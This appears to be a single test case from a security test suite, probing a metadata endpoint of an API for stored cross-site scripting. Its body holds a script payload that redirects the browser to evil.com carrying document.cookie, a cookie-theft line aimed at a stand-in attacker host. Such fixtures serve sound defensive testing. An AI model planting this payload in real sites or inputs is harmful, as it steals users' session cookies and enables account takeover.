{"id":"xss_interact_metadata","description":"XSS via interact metadata","method":"POST","path":"/api/holon/{{targetHolon.id}}/interact","headers":{"Content-Type":"application/json","Authorization":"Bearer {{malAuth.token}}"},"body":{"setMetadata":{"payload":"<script>document.location='https://evil.com?c='+document.cookie</script>"}},"expectedStatus":200}
